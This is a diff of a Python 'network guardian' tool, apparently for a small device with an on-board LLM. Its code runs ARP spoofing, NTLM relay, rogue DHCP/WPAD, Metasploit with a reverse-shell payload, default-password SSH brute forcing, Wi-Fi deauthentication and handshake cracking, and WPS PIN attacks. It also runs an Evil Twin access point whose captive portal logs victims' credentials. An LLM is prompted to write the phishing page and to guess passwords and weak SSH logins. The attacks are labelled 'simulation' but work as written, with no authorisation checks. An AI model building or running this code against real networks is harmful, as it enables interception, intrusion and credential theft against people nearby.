-        update_status(f"Simulating ARP poisoning between {target_ip} and {gateway_ip} to test resilience...", "MITM Simulation")
-        try:
-            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
-            target_proc = subprocess.Popen(["arpspoof", "-i", self.interface, "-t", target_ip, gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            gw_proc = subprocess.Popen(["arpspoof", "-i", self.interface, "-t", gateway_ip, target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            guardian_state["mitm_simulation"] = { "target_ip": target_ip, "gateway_ip": gateway_ip, "processes": [target_proc.pid, gw_proc.pid] }
-            update_status(f"ARP poisoning simulation active between {target_ip} and {gateway_ip}", "MITM Simulation")
-            return True
-        except Exception as e:
-            update_status(f"ARP poisoning simulation failed: {e}", "Error")
-            return False
-
-    def get_wan_ip(self):
-        update_status("Determining WAN IP address...", "Discovery")
-        try:
-            result = subprocess.run(["curl", "-s", "https://api.ipify.org"], capture_output=True, text=True, check=True, timeout=10)
-            wan_ip = result.stdout.strip()
-            guardian_state["wan_ip"] = wan_ip
-            update_status(f"WAN IP: {wan_ip}", "Discovery")
-            return wan_ip
-        except Exception as e:
-            update_status(f"Failed to get WAN IP: {e}", "Error")
-            return None
-
-    def _load_audit_history(self):
-        history_file = os.path.join(SD_CARD_LOG_PATH, "audit_history.json")
-        try:
-            if os.path.exists(history_file):
-                with open(history_file, 'r') as f: return json.load(f)
-        except Exception: pass
-        return []
-
-    def _calculate_success_rates(self, history):
-        if not history: return {}
-        success_counts, total_counts = {}, {}
-        for entry in history:
-            audit_type = entry.get('action')
-            if audit_type:
-                total_counts[audit_type] = total_counts.get(audit_type, 0) + 1
-                if entry.get('success'):
-                    success_counts[audit_type] = success_counts.get(audit_type, 0) + 1
-        return { t: (success_counts.get(t, 0) / total_counts[t]) for t in total_counts }
-
-    def simulate_ntlm_relay(self, targets: list[str]):
-        update_status(f"Simulating NTLMv2 relay against {targets} to test for vulnerability", "Simulation")
-        config = NTLMRelayxConfig(); config.targets = targets
-        relay = NTLMRelayx(config)
-        threading.Thread(target=relay.start, daemon=True).start()
-        return True
-
-    def simulate_dhcp_wpad_spoof(self, rogue_dns: str = None):
-        dns = rogue_dns or guardian_state.get("wan_ip", "8.8.8.8")
-        update_status("Simulating rogue DHCP & WPAD to test resilience", "Simulation")
-        dhcp_conf = f"default-lease-time 600;\nmax-lease-time 7200;\nauthoritative;\nsubnet 10.0.0.0 netmask 255.255.255.0 {{\n  range 10.0.0.50 10.0.0.200;\n  option routers 10.0.0.1;\n  option domain-name-servers {dns};\n  option wpad.url \"http://{dns}/wpad.dat\";\n}}"
-        with open("/tmp/dhcpd.conf", "w") as f: f.write(dhcp_conf)
-        subprocess.Popen(["sudo", "dhcpd", "-cf", "/tmp/dhcpd.conf", self.interface])
-        update_status("Rogue DHCP simulation is up", "Simulation")
-        return True
-
-    def masscan_scan(self, cidr: str, rate: int = 100000):
-        update_status(f"Running masscan on {cidr} @ {rate}pps", "Discovery (masscan)")
-        out = "/tmp/masscan.json"
-        cmd = ["masscan", cidr, "-p1-65535", f"--rate={rate}", "-oJ", out]
-        subprocess.run(cmd, check=True, timeout=60)
-        with open(out) as f: results = json.load(f)
-        update_status(f"masscan returned {len(results)} entries", "Discovery (masscan)")
-        return results
-
+    # --- _log_audit_result Function (Private) ---
+    # Logs the result of an audit action to a JSON file on the SD card.
+    # This helps in maintaining a history of all security checks performed.
     def _log_audit_result(self, action, target, success, details):
         entry = { "timestamp": time.time(), "action": action, "target": target, "success": success, "details": details }
         history_file = os.path.join(SD_CARD_LOG_PATH, "audit_history.json")
-        history = self._load_audit_history()
+        history = self.lan._load_audit_history()
         history.append(entry)
         try:
             with open(history_file, 'w') as f: json.dump(history, f)
         except Exception as e:
             update_status(f"Failed to log audit result: {e}", "Warning")
 
-class VulnerabilitySimulator:
-    def __init__(self, rpc_pass="abc123"):
-        self.client = MsfRpcClient(rpc_pass, timeout=30)
-    
-    def simulate_exploit(self, exploit_name, target_ip, payload="generic/shell_reverse_tcp"):
-        mod = self.client.modules.use('exploit', exploit_name)
-        mod['RHOSTS'] = target_ip
-        mod['PAYLOAD'] = payload
-        lhost, _ = LanAnalyzer(LAN_INTERFACE).get_local_ip_and_subnet()
-        mod['LHOST'] = lhost
-        # Use check_exploit to safely test, not execute
-        result = mod.check()
-        update_status(f"Metasploit check for {exploit_name} on {target_ip} returned: {result}", "Simulation")
-        return result.get('code') == 'vulnerable'
-
-    def simulate_known_vulnerabilities(self, target_ip, port, service):
-        update_status(f"Simulating known exploits on {target_ip}:{port} ({service})...", "Simulation")
-        # This would contain logic to map services to non-destructive checks
-        return False # Placeholder
-
-    def self_update(self):
-        update_status("Performing self-update...", "Update")
-        try:
-            subprocess.run(['git','-C','/opt/guardian','pull'], check=True, timeout=60)
-            subprocess.run(['sudo','apt','update'], check=True, timeout=120)
-            subprocess.run(['sudo','apt','install','-y', 'metasploit-framework','masscan','bettercap'], check=True, timeout=300)
-            update_status("Self-update complete.", "Update")
-        except Exception as e:
-            update_status(f"Self-update failed: {e}", "Error")
-
+    # --- Main Loop and Analysis Sequence ---
     def ai_guardian_loop(self):
         update_status("AI Network Guardian starting...", "Running")
         if not getattr(self, "updated", False) and self.lan.get_wan_ip():
-            self.self_update()
+            self.simulator.self_update()
             self.updated = True
         
         guardian_state["ai_running"] = True
@@ -1073,6 +481,871 @@ class VulnerabilitySimulator:
         elif "ssh" in service and port == "22": return "exploit/multi/ssh/sshexec"
         return None
 
+# --- Host Discovery Helper Functions ---
+
+# discover_hosts Function
+# Discovers live hosts on a given network CIDR using Nmap's ping scan (`-sn`).
+# Returns a list of IP addresses of active hosts.
+def discover_hosts(network_cidr: str) -> list[str]:
+    update_status(f"Discovering live hosts on {network_cidr} using Nmap...", "Discovery")
+    try:
+        nm = nmap.PortScanner()
+        nm.scan(hosts=network_cidr, arguments='-sn')
+        live_hosts = [h for h in nm.all_hosts() if nm[h].state() == 'up']
+        update_status(f"Found {len(live_hosts)} live hosts.", "Discovery")
+        return live_hosts
+    except nmap.PortScannerError as e:
+        update_status(f"Nmap host discovery failed: {e}", "Error")
+        return []
+    except Exception as e:
+        update_status(f"Error during host discovery: {e}", "Error")
+        return []
+
+# --- SSH Attempt Logic Functions ---
+STATIC_CREDS = [("root","root"), ("admin","admin"), ("pi","raspberry"), ("user","user")]
+
+# try_ssh Function
+# Attempts to establish an SSH connection to a given host with provided credentials.
+# Returns True if the connection is successful, False otherwise.
+def try_ssh(host: str, user: str, pwd: str, timeout: float=5.0) -> bool:
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(host, username=user, password=pwd, timeout=timeout, banner_timeout=timeout)
+        ssh.close()
+        return True
+    except (paramiko.AuthenticationException, paramiko.SSHException, socket.error):
+        return False
+    except Exception as e:
+        update_status(f"Unexpected error during SSH attempt on {host}: {e}", "Error")
+        return False
+
+# --- LLM Communication Module (ZMQ StackFlow Client) Class ---
+class StackFlowClient:
+    """
+    A client class for communicating with the on-device Large Language Model (LLM)
+    via the StackFlow framework using ZeroMQ (ZMQ). It handles connection,
+    LLM setup, and inference requests.
+    """
+    # --- Constructor ---
+    # Initializes the ZMQ client with the LLM endpoint and sets up ZMQ sockets and poller.
+    def __init__(self, endpoint):
+        self.endpoint = endpoint
+        self.context = zmq.Context.instance()
+        self.socket = None
+        self.llm_work_id = None
+        self.poller = zmq.Poller()
+        self.max_retries = 3
+        self.request_timeout = 30000
+        self._initialize_socket()
+
+    # --- _initialize_socket Function (Private) ---
+    # Initializes or re-initializes the ZMQ request socket, unregistering and closing
+    # any existing socket before creating a new one and connecting to the endpoint.
+    def _initialize_socket(self):
+        if self.socket:
+            self.poller.unregister(self.socket)
+            self.socket.close()
+        
+        self.socket = self.context.socket(zmq.REQ)
+        assert self.socket is not None, "Socket creation failed"
+        self.socket.setsockopt(zmq.LINGER, 0)
+        self.socket.setsockopt(zmq.RCVTIMEO, self.request_timeout)
+        self.poller.register(self.socket, zmq.POLLIN)
+        self.socket.connect(self.endpoint)
+
+    # --- _lazy_pirate_request Function (Private) ---
+    # Implements a "Lazy Pirate" retry pattern for robust ZMQ requests.
+    # It retries sending a request multiple times and re-initializes the socket
+    # if a timeout or ZMQ error occurs. Falls back to UART if max retries are reached.
+    def _lazy_pirate_request(self, data):
+        retries = 0
+        while retries < self.max_retries:
+            try:
+                assert self.socket is not None
+                self.socket.send_json(data)
+                socks = dict(self.poller.poll(self.request_timeout))
+                if socks.get(self.socket) == zmq.POLLIN:
+                    assert self.socket is not None
+                    return self.socket.recv_json()
+                else:
+                    raise zmq.Again("Timeout waiting for response")
+            except (zmq.Again, zmq.ZMQError) as e:
+                retries += 1
+                update_status(f"Request failed (attempt {retries}/{self.max_retries}): {e}", "Warning")
+                self._initialize_socket()
+                continue
+        update_status("Max ZMQ retries reached, attempting UART fallback.", "Warning")
+        return send_via_uart(data)
+
+    # --- _send_and_receive_json Function (Private) ---
+    # A wrapper around `_lazy_pirate_request` to send and receive JSON data.
+    # It handles general exceptions during ZMQ communication.
+    def _send_and_receive_json(self, data):
+        try:
+            return self._lazy_pirate_request(data)
+        except Exception as e:
+            update_status(f"ZMQ communication error: {e}", "Error")
+            return None
+
+    # --- reset_system Function ---
+    # Sends a reset command to the StackFlow system before setup.
+    def reset_system(self):
+        update_status("Resetting StackFlow system...", "AI Init")
+        reset_req = {
+            "request_id": str(uuid.uuid4()),
+            "work_id": "sys",
+            "action": "reset"
+        }
+        response = self._send_and_receive_json(reset_req)
+        if response and response.get("error", {}).get("code") == 0:
+            update_status("StackFlow system reset successfully.", "AI Init")
+            return True
+        error_details = response.get('error', 'Unknown error') if response else 'No response'
+        update_status(f"StackFlow system reset failed: {error_details}", "Error")
+        return False
+
+    # --- setup_llm Function ---
+    # Configures the LLM with a specified model and initial prompt.
+    # It sends a setup request to the StackFlow service and stores the `llm_work_id`
+    # for subsequent inference requests.
+    def setup_llm(self, model="qwen2.5-0.5B-int8-ax630c", prompt="You are GuardianGPT, a cybersecurity AI. Analyze network data and provide security recommendations. Respond ONLY with a single, valid JSON object."):
+        init_data = {
+            "request_id": str(uuid.uuid4()),
+            "work_id": "llm",
+            "action": "setup",
+            "object": "llm.setup",
+            "data": { "model": model, "response_format": "llm.utf-8.stream", "input": "llm.utf-8.stream", "enoutput": True, "max_token_len": 2048, "prompt": prompt }
+        }
+        resp = self._send_and_receive_json(init_data)
+        if resp and resp.get("error", {}).get("code") == 0:
+            self.llm_work_id = resp.get("work_id")
+            if self.llm_work_id:
+                update_status(f"LLM session initialized with work_id: {self.llm_work_id}", "AI Init")
+                return True
+        
+        error_details = resp.get('error', 'Unknown error') if resp else 'No response'
+        update_status(f"LLM Setup Error: {error_details}", "Error")
+        return False
+
+    # --- get_llm_inference Function ---
+    # Sends a user prompt to the LLM for inference and streams the response.
+    # It handles chunked responses and attempts to parse the full response as JSON.
+    def get_llm_inference(self, user_prompt):
+        if not self.llm_work_id:
+            update_status("LLM session not initialized, cannot run inference.", "Error")
+            return None
+
+        req = { "request_id": str(uuid.uuid4()), "work_id": self.llm_work_id, "action": "inference", "object": "llm.utf-8.stream", "data": {"delta": user_prompt, "index": 0, "finish": True} }
+        
+        response = self._send_and_receive_json(req)
+        if not response:
+            update_status("LLM inference request failed (no initial response).", "Error")
+            return None
+
+        # The original code had a streaming loop that was incompatible with ZMQ REQ sockets.
+        # It has been corrected to process a single, complete response.
+        full_response = ""
+        if 'data' in response and 'delta' in response['data']:
+            full_response = response['data']['delta']
+        else:
+            # If the structure is different, let's try to find the response string.
+            # This handles cases where the response might not be in data.delta.
+            if isinstance(response.get('data'), str):
+                full_response = response['data']
+            elif isinstance(response, str):
+                 full_response = response
+
+        if not full_response:
+            update_status("Received empty or malformed response from LLM.", "Warning")
+            return None
+
+        try:
+            return json.loads(full_response)
+        except json.JSONDecodeError:
+            update_status(f"Could not parse JSON from LLM response: {full_response}", "Error")
+            m = re.search(r'\{.*\}', full_response, re.DOTALL)
+            if m:
+                try: return json.loads(m.group(0))
+                except json.JSONDecodeError: update_status("Fallback JSON parsing also failed.", "Error")
+            return None
+
+    # --- close Function ---
+    # Closes the LLM session and terminates the ZMQ context, releasing resources.
+    def close(self):
+        if self.llm_work_id:
+            self._send_and_receive_json({"request_id": "llm_exit", "work_id": self.llm_work_id, "action": "exit"})
+        if self.socket:
+            self.socket.close()
+        self.context.term()
+
+# --- Core Security & Analysis Modules ---
+# --- Core Security & Analysis Modules ---
+
+# WiFiSecurityModule Class
+class WiFiSecurityModule:
+    """
+    Manages Wi-Fi related security operations, including network scanning,
+    monitor mode setup, handshake capture, WPS auditing, and rogue AP simulation.
+    """
+    # --- Constructor ---
+    # Initializes the module with the specified Wi-Fi interface and ensures
+    # that necessary tools (airmon-ng, airodump-ng, etc.) are available.
+    def __init__(self, interface):
+        self.interface = interface
+        self._ensure_tools(["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "nmcli", "iw", "reaver", "hostapd", "dnsmasq"])
+
+    # --- _ensure_tools Function (Private) ---
+    # Checks for the presence of required command-line tools and attempts to install
+    # them if they are missing (currently supports reaver, hostapd, dnsmasq).
+    def _ensure_tools(self, tools):
+        for tool in tools:
+            try:
+                subprocess.run(["which", tool], check=True, capture_output=True, timeout=5)
+            except Exception:
+                update_status(f"Warning: Tool '{tool}' not found. Attempting installation...", "Error")
+                try:
+                    packages = {"reaver": "reaver", "hostapd": "hostapd", "dnsmasq": "dnsmasq"}
+                    if tool in packages:
+                        subprocess.run(["sudo", "apt-get", "install", "-y", packages[tool]], check=True, timeout=120)
+                        update_status(f"Successfully installed {packages[tool]}.", "Init")
+                    else:
+                        update_status(f"No automatic installation configured for '{tool}'.", "Error")
+                except Exception as e:
+                    update_status(f"Failed to install missing tool '{tool}': {e}", "Error")
+
+    # --- set_monitor_mode Function ---
+    # Enables or disables monitor mode on the specified Wi-Fi interface.
+    # Monitor mode is necessary for passive network scanning and packet capture.
+    def set_monitor_mode(self, enable=True):
+        update_status(f"Setting monitor mode to {enable}...", "Wi-Fi Setup")
+        try:
+            mode_cmd = "monitor" if enable else "managed"
+            if enable: subprocess.run(["airmon-ng", "check", "kill"], check=False, capture_output=True)
+            subprocess.run(["ip", "link", "set", self.interface, "down"], check=True)
+            subprocess.run(["iw", self.interface, "set", "type", mode_cmd], check=True)
+            subprocess.run(["ip", "link", "set", self.interface, "up"], check=True)
+            if not enable: subprocess.run(["service", "NetworkManager", "start"], check=False, capture_output=True)
+            guardian_state["wireless_mode"] = mode_cmd
+            return True
+        except Exception as e:
+            update_status(f"Failed to set monitor mode: {e}", "Error")
+            return False
+
+    # --- scan_wifi_networks Function ---
+    # Scans for nearby Wi-Fi networks using `airodump-ng` and parses the output
+    # to extract network details like SSID, BSSID, encryption, signal strength, and connected clients.
+    def scan_wifi_networks(self):
+        if guardian_state["wireless_mode"] != "monitor" and not self.set_monitor_mode(True): return []
+        update_status("Scanning for Wi-Fi networks...", "Wi-Fi Scanning")
+        networks = {}
+        prefix = "/tmp/airodump_scan"
+        for f in glob.glob(f"{prefix}*"): os.remove(f)
+        try:
+            cmd = ["airodump-ng", self.interface, "-w", prefix, "--output-format", "kismet,netxml,csv", "--wps"]
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            time.sleep(15); proc.terminate(); proc.wait(timeout=5)
+            xml_files = glob.glob(f"{prefix}*.netxml")
+            if not xml_files: return []
+            root = ET.parse(xml_files[0]).getroot()
+            for net in root.findall('wireless-network'):
+                ssid_el = net.find('SSID/essid')
+                bssid_el = net.find('BSSID')
+                channel_el = net.find('channel')
+                signal_el = net.find('snr-info/last_signal_dbm')
+
+                if ssid_el is None or ssid_el.text is None or bssid_el is None or bssid_el.text is None or channel_el is None or channel_el.text is None or signal_el is None or signal_el.text is None:
+                    continue
+
+                bssid = bssid_el.text
+                wps_el = net.find('SSID/wps-info/wps')
+                
+                encryptions = [e.text for e in net.findall('encryption') if e.text is not None]
+
+                networks[bssid] = {
+                    "ssid": ssid_el.text, "bssid": bssid, "channel": int(channel_el.text),
+                    "encryption": " / ".join(sorted(list(set(encryptions)))) or "OPEN",
+                    "signal_strength": int(signal_el.text), "clients": 0,
+                    "wps_enabled": wps_el is not None and wps_el.text == 'Yes'
+                }
+            csv_files = glob.glob(f"{prefix}*.csv")
+            if csv_files:
+                with open(csv_files[0], 'r') as f:
+                    reader = csv.reader(f, skipinitialspace=True)
+                    in_clients = False
+                    for row in reader:
+                        if row and row[0].strip() == 'Station MAC': in_clients = True; continue
+                        if in_clients and len(row) > 5 and row[5].strip() in networks: networks[row[5].strip()]["clients"] += 1
+            return list(networks.values())
+        except Exception as e:
+            update_status(f"Wi-Fi scan error: {e}", "Error"); return []
+
+    # --- capture_handshake_for_audit Function ---
+    # Captures a WPA/WPA2 handshake for a given SSID and BSSID using `airodump-ng`
+    # and `aireplay-ng`. This handshake is then used for password strength analysis.
+    def capture_handshake_for_audit(self, ssid, bssid, channel):
+        if guardian_state["wireless_mode"] != "monitor" and not self.set_monitor_mode(True): return None
+        update_status(f"Capturing handshake for {ssid} to audit password strength...", "Wi-Fi Audit", ssid)
+        path = os.path.join(SD_CARD_LOG_PATH, f"{ssid}_handshake")
+        try:
+            dump_cmd = ["airodump-ng", "--bssid", bssid, "--channel", str(channel), "-w", path, self.interface]
+            dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            time.sleep(5)
+            subprocess.run(["aireplay-ng", "-0", "5", "-a", bssid, self.interface], check=True, capture_output=True, timeout=30)
+            time.sleep(10)
+            dump_proc.terminate(); dump_proc.wait(timeout=5)
+            cap_file = f"{path}-01.cap"
+            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0: return cap_file
+            return None
+        except Exception as e:
+            update_status(f"Handshake capture failed: {e}", "Error"); return None
+
+    # --- audit_wps Function ---
+    # Audits a Wi-Fi network for WPS vulnerabilities using `reaver`.
+    # If a WPS PIN or WPA PSK is recovered, it indicates a vulnerability.
+    def audit_wps(self, bssid):
+        update_status(f"Starting WPS vulnerability audit on {bssid}...", "Wi-Fi Audit", bssid)
+        try:
+            cmd = ["reaver", "-i", self.interface, "-b", bssid, "-vv", "-K", "1"]
+            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=WPS_AUDIT_TIMEOUT)
+            pin_match = re.search(r"WPS PIN: '(\d+)'", proc.stdout)
+            pass_match = re.search(r"WPA PSK: '(.+)'", proc.stdout)
+            if pass_match:
+                update_status(f"WPS is vulnerable on {bssid}. Password recovered. Recommend disabling WPS.", "Vulnerability Found")
+                return pass_match.group(1)
+            if pin_match:
+                update_status(f"WPS PIN found: {pin_match.group(1)}. Re-running to get PSK.", "Wi-Fi Audit")
+                proc = subprocess.run(cmd + ["-p", pin_match.group(1)], capture_output=True, text=True, timeout=300)
+                pass_match = re.search(r"WPA PSK: '(.+)'", proc.stdout)
+                if pass_match: return pass_match.group(1)
+            update_status(f"WPS audit on {bssid} complete. No vulnerabilities found.", "Wi-Fi Audit")
+            return None
+        except Exception as e:
+            update_status(f"WPS audit failed: {e}", "Error")
+            return None
+
+    # --- simulate_rogue_ap Function ---
+    # Simulates a rogue access point (Evil Twin) attack using `hostapd` and `dnsmasq`.
+    # This tests the network's resilience against credential harvesting.
+    def simulate_rogue_ap(self, ssid, channel, llm_client):
+        update_status(f"Simulating Rogue AP for {ssid} to test network resilience...", "Simulation", ssid)
+        hostapd_conf_path = "/tmp/hostapd_rogue.conf"
+        dnsmasq_conf_path = "/tmp/dnsmasq_rogue.conf"
+        
+        hostapd_conf = f"interface={self.interface}\ndriver=nl80211\nssid={ssid}\nchannel={channel}\nhw_mode=g\n"
+        dnsmasq_conf = f"interface={self.interface}\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\naddress=/#/10.0.0.1\n"
+        
+        try:
+            with open(hostapd_conf_path, "w") as f: f.write(hostapd_conf)
+            with open(dnsmasq_conf_path, "w") as f: f.write(dnsmasq_conf)
+            
+            subprocess.run(["ip", "addr", "flush", "dev", self.interface], check=True)
+            subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", self.interface], check=True)
+            
+            subprocess.Popen(["hostapd", hostapd_conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.Popen(["dnsmasq", "-C", dnsmasq_conf_path, "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            self.simulate_captive_portal(llm_client, ssid)
+            update_status("Rogue AP simulation and captive portal are active.", "Simulation")
+            return True
+        except Exception as e:
+            update_status(f"Rogue AP simulation failed: {e}", "Error")
+            return False
+
+    # --- simulate_captive_portal Function ---
+    # Generates and serves a simulated captive portal login page using Flask.
+    # This is part of the rogue AP simulation to capture credentials.
+    def simulate_captive_portal(self, llm_client, target_ssid):
+        prompt = f"Generate complete HTML/CSS for a captive portal login page for a Wi-Fi network named '{target_ssid}'. The form should POST to '/login'. This is for a security simulation. Respond ONLY with HTML."
+        portal_html = llm_client.get_llm_inference(prompt)
+        if not portal_html or not isinstance(portal_html, str):
+            portal_html = f"<html><body><h1>Login to {target_ssid}</h1><form method='post' action='/login'><input name='username' placeholder='Username'><input name='password' type='password' placeholder='Password'><button type='submit'>Log In</button></form></body></html>"
+        
+        from flask import Flask, request as flask_request, render_template_string as flask_render_template_string
+        portal_app = Flask("captive_portal")
+        
+        @portal_app.route('/')
+        def serve_portal(): return flask_render_template_string(portal_html)
+        
+        @portal_app.route('/login', methods=['POST'])
+        def capture_creds():
+            creds = flask_request.form.to_dict()
+            update_status(f"Captive portal simulation captured credentials: {json.dumps(creds)}", "Simulation Result")
+            log_to_sd_card("rogue_ap_credentials.log", json.dumps(creds))
+            return "<h3>Connection Successful! This was a security test.</h3>"
+            
+        def run_portal():
+            try: portal_app.run(host='0.0.0.0', port=80, debug=False)
+            except Exception as e: update_status(f"Captive portal simulation failed: {e}", "Error")
+            
+        threading.Thread(target=run_portal, daemon=True).start()
+
+    # --- connect_to_network Function ---
+    # Connects the device to a specified Wi-Fi network using `nmcli`.
+    # It can handle both open and password-protected networks.
+    def connect_to_network(self, ssid, password=None):
+        if guardian_state["wireless_mode"] == "monitor": self.set_monitor_mode(enable=False); time.sleep(5)
+        update_status(f"Connecting to {ssid}...", "Connecting", ssid)
+        try:
+            cmd = ["nmcli", "device", "wifi", "connect", ssid]
+            if password: cmd.extend(["password", password])
+            subprocess.run(cmd, check=True, capture_output=True, timeout=30)
+            update_status(f"Successfully connected to {ssid}", "Connected", ssid)
+            return True
+        except Exception as e:
+            update_status(f"Failed to connect to {ssid}: {e}", "Error")
+            return False
+
+# PasswordStrengthAnalyzer Class
+class PasswordStrengthAnalyzer:
+    """
+    Analyzes password strength for Wi-Fi networks and SSH credentials.
+    It leverages the LLM to generate intelligent password guesses and
+    manages a dynamic password list.
+    """
+    # --- Constructor ---
+    # Initializes the analyzer with the AI model path, LLM client,
+    # and loads common and AI-generated passwords.
+    def __init__(self, model_path, llm_client):
+        self.model_path = model_path
+        self.llm_client = llm_client
+        self.sd_password_file = "/mnt/sdcard/assets/ai_generated_passwords.txt"
+        self.common_passwords = self._load_common_passwords()
+
+    # --- get_mac_vendor Function ---
+    # Attempts to retrieve the MAC address and vendor information for a given IP address
+    # using Nmap. This information can be used to inform AI-driven credential guessing.
+    def get_mac_vendor(self, host_ip: str) -> str:
+        try:
+            nm = nmap.PortScanner()
+            nm.scan(hosts=host_ip, arguments='-sn')
+            if host_ip not in nm.all_hosts():
+                return "unknown"
+            host_info = nm[host_ip]
+            if not host_info:
+                return "unknown"
+            addresses = host_info.get('addresses')
+            if not addresses:
+                return "unknown"
+            mac = addresses.get('mac', 'unknown')
+            if mac != 'unknown':
+                vendor = host_info.get('vendor', {}).get(mac, 'unknown')
+                return f"{mac} ({vendor})" if vendor != 'unknown' else mac
+            return "unknown"
+        except Exception:
+            return "unknown"
+
+    # --- propose_ssh_creds Function ---
+    # Queries the LLM to propose likely weak or default SSH username/password combinations
+    # for a given host IP, considering its MAC vendor information.
+    def propose_ssh_creds(self, host_ip: str) -> list[tuple[str,str]]:
+        update_status(f"Asking AI for likely weak SSH creds for {host_ip}...", "AI Inference")
+        mac_vendor = self.get_mac_vendor(host_ip)
+        prompt = (
+            f"You are GuardianGPT. Suggest the 5 most likely weak or default SSH login "
+            f"username/password combinations for a Linux host at {host_ip} "
+            f"with manufacturer info: {mac_vendor}. Consider common defaults. "
+            "Respond ONLY with JSON: [{\"user\":\"root\",\"pass\":\"toor\"}, {\"user\":\"admin\",\"pass\":\"password\"}]"
+        )
+        result = self.llm_client.get_llm_inference(prompt)
+        if isinstance(result, list):
+            try:
+                pairs = [(item["user"], item["pass"]) for item in result if "user" in item and "pass" in item]
+                update_status(f"AI proposed {len(pairs)} weak SSH creds for {host_ip}.", "AI Inference")
+                return pairs
+            except Exception as e:
+                update_status(f"Error parsing AI SSH creds: {e}. Raw: {result}", "Error")
+        update_status(f"AI did not provide valid SSH creds for {host_ip}. Falling back to static list.", "Warning")
+        return []
+
+    # --- _load_common_passwords Function (Private) ---
+    # Loads common passwords from a local file and dynamically generated passwords
+    # from a file on the SD card, combining them into a single list.
+    def _load_common_passwords(self):
+        os.makedirs(os.path.dirname(self.sd_password_file), exist_ok=True)
+        passwords = set()
+        try:
+            local_path = os.path.join(self.model_path, "common_passwords.txt")
+            with open(local_path, 'r') as f:
+                for line in f:
+                    if line.strip(): passwords.add(line.strip())
+            update_status("Loaded base passwords from local assets.", "Init")
+        except Exception as e:
+            update_status(f"Could not load base passwords: {e}", "Warning")
+        try:
+            update_status(f"Loading dynamically generated passwords from {self.sd_password_file}", "Init")
+            with open(self.sd_password_file, 'a+') as f:
+                f.seek(0)
+                for line in f:
+                    if line.strip(): passwords.add(line.strip())
+        except Exception as e:
+            update_status(f"Failed to load or create password file on SD card: {e}", "Error")
+        return list(passwords)
+
+    # --- generate_ai_guesses Function ---
+    # Uses the LLM to generate a list of likely password candidates based on a given context (e.g., SSID).
+    # These new guesses are appended to the SD card password file for future use.
+    def generate_ai_guesses(self, context, num_guesses=50):
+        update_status(f"Generating {num_guesses} AI password guesses for '{context}'...", "Password Analysis")
+        prompt = f"Generate a JSON list of {num_guesses} likely password candidates for a Wi-Fi network with the SSID '{context}'. Respond ONLY with a JSON array of strings."
+        response_json = self.llm_client.get_llm_inference(prompt)
+        ai_guesses = response_json if isinstance(response_json, list) else [f"{context}123", f"admin{context}"]
+        try:
+            existing_passwords = set(self.common_passwords)
+            new_guesses = [p for p in ai_guesses if p not in existing_passwords]
+            if new_guesses:
+                with open(self.sd_password_file, 'a') as f:
+                    for guess in new_guesses:
+                        f.write(guess + '\n')
+                update_status(f"Appended {len(new_guesses)} new passwords to SD card file.", "Password Analysis")
+                self.common_passwords.extend(new_guesses)
+        except Exception as e:
+            update_status(f"Failed to write AI guesses to SD card: {e}", "Error")
+        return ai_guesses
+
+    # --- verify_wpa2_password Function ---
+    # Verifies if a given password is correct for a WPA2 network using `aircrack-ng`
+    # and a captured handshake file.
+    def verify_wpa2_password(self, handshake_file, ssid, password):
+        tmp_wordlist = "/tmp/temp_candidate.txt"
+        try:
+            with open(tmp_wordlist, "w") as f: f.write(password + "\n")
+            cmd = ["aircrack-ng", "-w", tmp_wordlist, "-e", ssid, handshake_file]
+            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+            return "KEY FOUND!" in proc.stdout
+        except Exception: return False
+        finally:
+            if os.path.exists(tmp_wordlist): os.remove(tmp_wordlist)
+
+    # --- analyze_handshake Function ---
+    # Analyzes a captured WPA2 handshake file by attempting to crack the password
+    # using both common passwords and AI-generated guesses.
+    def analyze_handshake(self, handshake_file, ssid):
+        update_status(f"Starting password strength analysis for {ssid}...", "Password Analysis", ssid)
+        for password in self.common_passwords:
+            if guardian_state["stop_signal"].is_set(): return None
+            if self.verify_wpa2_password(handshake_file, ssid, password):
+                return password
+        ai_guesses = self.generate_ai_guesses(context=ssid)
+        for password in ai_guesses:
+            if guardian_state["stop_signal"].is_set(): return None
+            if self.verify_wpa2_password(handshake_file, ssid, password):
+                return password
+        return None
+
+# LanAnalyzer Class
+class LanAnalyzer:
+    """
+    Performs internal network analysis, including host discovery, port scanning,
+    vulnerability scanning, credential testing, and various network attack simulations.
+    """
+    # --- Constructor ---
+    # Initializes the analyzer with the specified network interface and ensures
+    # that necessary tools (nmap, arpspoof, nikto, hydra, smbclient) are available.
+    def __init__(self, interface):
+        self.interface = interface
+        self._ensure_tools(["nmap", "ip", "arpspoof", "nikto", "hydra", "smbclient", "dhcpd"])
+
+    # --- _ensure_tools Function (Private) ---
+    # Checks for the presence of required command-line tools and attempts to install
+    # them if they are missing (currently supports dsniff, nikto, hydra, smbclient).
+    def _ensure_tools(self, tools):
+        for tool in tools:
+            try:
+                subprocess.run(["which", tool], check=True, capture_output=True, timeout=5)
+            except Exception:
+                update_status(f"Warning: Tool '{tool}' not found. Attempting installation...", "Error")
+                try:
+                    packages = {"arpspoof": "dsniff", "nikto": "nikto", "hydra": "hydra", "smbclient": "smbclient", "dhcpd": "isc-dhcp-server"}
+                    if tool in packages:
+                        subprocess.run(["sudo", "apt-get", "install", "-y", packages[tool]], check=True, timeout=120)
+                        update_status(f"Successfully installed {packages[tool]}.", "Init")
+                    else:
+                        update_status(f"No automatic installation configured for '{tool}'.", "Error")
+                except Exception as e:
